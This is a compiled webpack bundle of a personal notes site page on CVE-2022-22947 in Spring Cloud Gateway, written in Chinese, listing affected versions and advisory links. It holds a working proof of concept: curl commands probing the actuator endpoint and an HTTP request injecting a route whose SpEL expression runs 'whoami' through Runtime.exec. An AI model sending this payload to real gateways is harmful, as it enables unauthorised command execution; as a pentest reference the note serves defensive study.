"use strict";(self.webpackChunkwener_website=self.webpackChunkwener_website||[]).push([[15920],{49613:function(e,t,n){n.d(t,{Zo:function(){return u},kt:function(){return y}});var r=n(59496);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function c(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n,r,a={},o=Object.keys(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var l=r.createContext({}),p=function(e){var t=r.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},u=function(e){var t=p(e.components);return r.createElement(l.Provider,{value:t},e.children)},s="mdxType",m={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},f=r.forwardRef((function(e,t){var n=e.components,a=e.mdxType,o=e.originalType,l=e.parentName,u=c(e,["components","mdxType","originalType","parentName"]),s=p(n),f=a,y=s["".concat(l,".").concat(f)]||s[f]||m[f]||o;return n?r.createElement(y,i(i({ref:t},u),{},{components:n})):r.createElement(y,i({ref:t},u))}));function y(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var o=n.length,i=new Array(o);i[0]=f;var c={};for(var l in t)hasOwnProperty.call(t,l)&&(c[l]=t[l]);c.originalType=e,c[s]="string"==typeof e?e:a,i[1]=c;for(var p=2;p<o;p++)i[p]=n[p];return r.createElement.apply(null,i)}return r.createElement.apply(null,n)}f.displayName="MDXCreateElement"},64893:function(e,t,n){n.r(t),n.d(t,{assets:function(){return w},contentTitle:function(){return d},default:function(){return h},frontMatter:function(){return y},metadata:function(){return g},toc:function(){return v}});var r=n(49613),a=Object.defineProperty,o=Object.defineProperties,i=Object.getOwnPropertyDescriptors,c=Object.getOwnPropertySymbols,l=Object.prototype.hasOwnProperty,p=Object.prototype.propertyIsEnumerable,u=(e,t,n)=>t in e?a(e,t,{enumerable:!0,configurable:!0,writable:!0,value:n}):e[t]=n,s=(e,t)=>{for(var n in t||(t={}))l.call(t,n)&&u(e,n,t[n]);if(c)for(var n of c(t))p.call(t,n)&&u(e,n,t[n]);return e},m=(e,t)=>o(e,i(t)),f=(e,t)=>{var n={};for(var r in e)l.call(e,r)&&t.indexOf(r)<0&&(n[r]=e[r]);if(null!=e&&c)for(var r of c(e))t.indexOf(r)<0&&p.call(e,r)&&(n[r]=e[r]);return n};const y={title:"CVE"},d="CVE",g={unversionedId:"security/cve",id:"security/cve",title:"CVE",description:"- https://www.cve.org/",source:"@site/../notes/security/cve.md",sourceDirName:"security",slug:"/security/cve",permalink:"/notes/security/cve",draft:!1,editUrl:"https://github.com/wenerme/wener/edit/master/notes/../notes/security/cve.md",tags:[],version:"current",lastUpdatedBy:"wener",lastUpdatedAt:1693463269,formattedLastUpdatedAt:"Aug 31, 2023",frontMatter:{title:"CVE"},sidebar:"docs",previous:{title:"SOPS",permalink:"/notes/security/crypto/sops"},next:{title:"DDoS",permalink:"/notes/security/ddos"}},w={},v=[{value:"CVE-2022-22947",id:"cve-2022-22947",level:2}],b={toc:v},k="wrapper";function h(e){var t=e,{components:n}=t,a=f(t,["components"]);return(0,r.kt)(k,m(s(s({},b),a),{components:n,mdxType:"MDXLayout"}),(0,r.kt)("h1",s({},{id:"cve"}),"CVE"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("a",s({parentName:"li"},{href:"https://www.cve.org/"}),"https://www.cve.org/"))),(0,r.kt)("h2",s({},{id:"cve-2022-22947"}),"CVE-2022-22947"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"Java, SpringCloud Gateway",(0,r.kt)("ul",{parentName:"li"},(0,r.kt)("li",{parentName:"ul"},"3.1.0"),(0,r.kt)("li",{parentName:"ul"},"3.0.0-3.0.6"),(0,r.kt)("li",{parentName:"ul"},"< 3.0")))),(0,r.kt)("pre",null,(0,r.kt)("code",s({parentName:"pre"},{className:"language-bash"}),"# \u6d4b\u8bd5 gateway \u662f\u5426\u5f00\u542f actuator \u7ba1\u7406\ncurl -X POST http://gateway/actuator/gateway/refresh -v\n")),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"\u6ce8\u5165\u6076\u610f\u8def\u7531")),(0,r.kt)("pre",null,(0,r.kt)("code",s({parentName:"pre"},{className:"language-http"}),'POST http://gateway/actuator/gateway/routes/pentest\nContent-Type: application/json\n\n{\n  "id": "pentest",\n  "filters": [\n    {\n      "name": "AddResponseHeader",\n      "args": {\n        "name": "X-Request-Foo",\n        "": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(getRuntime().exec(new String[]{\\"whoami\\"}).getInputStream()))}"\n      },\n      "uri": "http://httpbin.org/get",\n      "predicates": [\n        {\n          "name": "Method",\n          "args": {\n            "_key_0": "GET"\n          }\n        },\n        {\n          "name": "Path",\n          "args": {\n            "_key_0": "/pentest"\n          }\n        }\n      ]\n    }\n  ]\n}\n')),(0,r.kt)("pre",null,(0,r.kt)("code",s({parentName:"pre"},{className:"language-bash"}),"# \u5237\u65b0\ncurl -X POST http://gateway/actuator/gateway/refresh -v\n# \u65b0\u7684\u8def\u7531\u5305\u542b X-Request-Foo: $(whoami)\ncurl -X POST http://gateway/pentest -v\n")),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"\u914d\u7f6e\u4e0d\u540c\u65f6\u6ee1\u8db3\u5373\u53ef")),(0,r.kt)("pre",null,(0,r.kt)("code",s({parentName:"pre"},{className:"language-ini"}),"management.endpoint.gateway.enabled=true # default value\nmanagement.endpoints.web.exposure.include=gateway\n")),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("a",s({parentName:"li"},{href:"https://spring.io/security/cve-2022-22947"}),"https://spring.io/security/cve-2022-22947")),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("a",s({parentName:"li"},{href:"https://www.anquanke.com/post/id/269795"}),"https://www.anquanke.com/post/id/269795"))))}h.isMDXComponent=!0}}]);